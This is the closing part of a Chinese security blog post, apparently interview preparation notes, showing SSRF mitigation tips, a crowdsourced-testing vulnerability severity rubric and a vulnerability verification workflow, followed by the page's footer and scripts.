+<li><strong>过滤返回信息</strong>：验证远程服务器对请求的响应，避免泄露敏感信息。</li>
+<li><strong>统一错误信息</strong>：避免用户根据错误信息判断远端服务器的端口状态。</li>
+</ol>
+<h2 id="作为众测运营人员的问题"><a href="#作为众测运营人员的问题" class="headerlink" title="作为众测运营人员的问题"></a>作为众测运营人员的问题</h2><h3 id="漏洞等级评判标准"><a href="#漏洞等级评判标准" class="headerlink" title="漏洞等级评判标准"></a>漏洞等级评判标准</h3><ol>
+<li><p><strong>严重漏洞</strong>：</p>
+<ul>
+<li>发生在核心系统业务系统，可造成大面积影响，获取大量业务系统控制权限，获取核心系统管理人员权限并且可控制核心系统。</li>
+<li>包括但不限于控制内网多台机器、核心后台超级管理员权限获取且造成大范围企业核心数据泄露等。</li>
+</ul>
+</li>
+<li><p><strong>高危漏洞</strong>：</p>
+<ul>
+<li>获得系统的权限（如getshell、命令执行等）。</li>
+<li>系统的SQL注入（后台漏洞降级，打包提交酌情提升）。</li>
+<li>敏感信息越权访问（如绕过认证直接访问管理后台进行敏感操作、重要后台弱密码、获取大量内网敏感信息的SSRF等）。</li>
+<li>读取任意文件。</li>
+<li>涉及金钱的交易、绕过支付逻辑（需最终利用成功，优惠券相关问题除外）。</li>
+<li>严重的逻辑设计缺陷和流程缺陷（如任意用户登录漏洞、批量修改任意账号密码漏洞、涉及企业核心业务的逻辑漏洞等）。</li>
+<li>大范围影响用户的其他漏洞（如重要页面可自动传播的存储型XSS、可获取管理员认证信息且成功利用的存储型XSS等）。</li>
+<li>大量源代码泄露。</li>
+</ul>
+</li>
+<li><p><strong>中危漏洞</strong>：</p>
+<ul>
+<li>需交互方可影响用户的漏洞（如存储型XSS、涉及核心业务的CSRF等）。</li>
+<li>平行越权操作（如绕过限制修改用户资料、执行用户操作等）。</li>
+<li>由验证码逻辑导致任意账户登录、任意密码找回等系统敏感操作可被爆破成功造成的漏洞。</li>
+<li>本地保存的敏感认证密钥信息泄露，需能做出有效利用。</li>
+<li>四位验证码爆破重置密码或者登录账号。</li>
+<li>心脏滴血漏洞。</li>
+<li>XML注入。</li>
+<li>普通的后台或者边缘系统的后台。</li>
+<li>任意文件上传（如上传html导致存储XSS，其他情况除外）。</li>
+</ul>
+</li>
+<li><p><strong>低危漏洞</strong>：</p>
+<ul>
+<li>对系统的功能或性能影响较小。</li>
+<li>攻击者只能获得非敏感信息或执行有限的操作。</li>
+<li>存在已知的解决方案或临时修复措施。</li>
+</ul>
+</li>
+</ol>
+<h3 id="漏洞验证的逻辑和流程"><a href="#漏洞验证的逻辑和流程" class="headerlink" title="漏洞验证的逻辑和流程"></a>漏洞验证的逻辑和流程</h3><ol>
+<li><p><strong>环境准备</strong>：</p>
+<ul>
+<li>确保测试环境与生产环境一致，避免因环境差异导致的误判。</li>
+<li>准备必要的测试工具和数据。</li>
+</ul>
+</li>
+<li><p><strong>漏洞复现</strong>：</p>
+<ul>
+<li>根据提交的漏洞报告，尝试复现漏洞。</li>
+<li>记录复现步骤和结果，确保漏洞的真实性和可重复性。</li>
+</ul>
+</li>
+<li><p><strong>影响评估</strong>：</p>
+<ul>
+<li>评估漏洞对系统功能、性能、安全性的潜在影响。</li>
+<li>确定漏洞可能影响的用户范围和业务范围。</li>
+</ul>
+</li>
+<li><p><strong>利用难度评估</strong>：</p>
+<ul>
+<li>评估漏洞的利用难度，包括是否需要特定条件、是否需要高级技能等。</li>
+</ul>
+</li>
+<li><p><strong>可发现性评估</strong>：</p>
+<ul>
+<li>评估漏洞的可发现性，即攻击者发现该漏洞的难易程度。</li>
+</ul>
+</li>
+<li><p><strong>综合评分</strong>：</p>
+<ul>
+<li>结合上述评估结果，根据360SRC的评分标准，对漏洞进行综合评分，确定漏洞等级。</li>
+</ul>
+</li>
+<li><p><strong>报告生成</strong>：</p>
+<ul>
+<li>生成详细的漏洞报告，包括漏洞描述、复现步骤、影响评估、利用难度、可发现性等信息。</li>
+<li>提交报告给相关团队进行修复和处理。</li>
+</ul>
+</li>
+</ol>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/idea/">Idea</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E5%86%99shell%E6%96%B9%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text">数据库提权写shell方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL-%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.</span> <span class="toc-text">MySQL 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">MSSQL 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle-%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">Oracle 提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%B5%81%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">应急响应流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">SSRF 漏洞原理与应用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-%E6%BC%8F%E6%B4%9E%E4%B8%AD%E5%B8%B8%E7%94%A8%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%8A%9F%E8%83%BD%E5%92%8C%E4%BD%9C%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">SSRF 漏洞中常用协议的功能和作用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-file-%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.2.1.</span> <span class="toc-text">1. file 协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-dict-%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.2.2.</span> <span class="toc-text">2. dict 协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-gopher-%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.2.3.</span> <span class="toc-text">3. gopher 协议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="toc-number">3.3.</span> <span class="toc-text">漏洞发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.4.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8E-Redis-%E7%9A%84%E7%BB%93%E5%90%88%E5%88%A9%E7%94%A8"><span class="toc-number">3.5.</span> <span class="toc-text">与 Redis 的结合利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-number">3.6.</span> <span class="toc-text">漏洞防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%9C%E4%B8%BA%E4%BC%97%E6%B5%8B%E8%BF%90%E8%90%A5%E4%BA%BA%E5%91%98%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text">作为众测运营人员的问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AD%89%E7%BA%A7%E8%AF%84%E5%88%A4%E6%A0%87%E5%87%86"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞等级评判标准</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%9A%84%E9%80%BB%E8%BE%91%E5%92%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞验证的逻辑和流程</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godreams.cn/2024/03/26/work/workpreview/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godreams.cn/2024/03/26/work/workpreview/&text=【工作】重要面经！"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godreams.cn/2024/03/26/work/workpreview/&title=【工作】重要面经！"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godreams.cn/2024/03/26/work/workpreview/&is_video=false&description=【工作】重要面经！"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【工作】重要面经！&body=Check out this article: https://godreams.cn/2024/03/26/work/workpreview/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godreams.cn/2024/03/26/work/workpreview/&title=【工作】重要面经！"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godreams.cn/2024/03/26/work/workpreview/&title=【工作】重要面经！"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godreams.cn/2024/03/26/work/workpreview/&title=【工作】重要面经！"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godreams.cn/2024/03/26/work/workpreview/&title=【工作】重要面经！"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godreams.cn/2024/03/26/work/workpreview/&name=【工作】重要面经！&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godreams.cn/2024/03/26/work/workpreview/&t=【工作】重要面经！"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    g0dam
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/idea/">Idea</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'owner/githubrepo';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
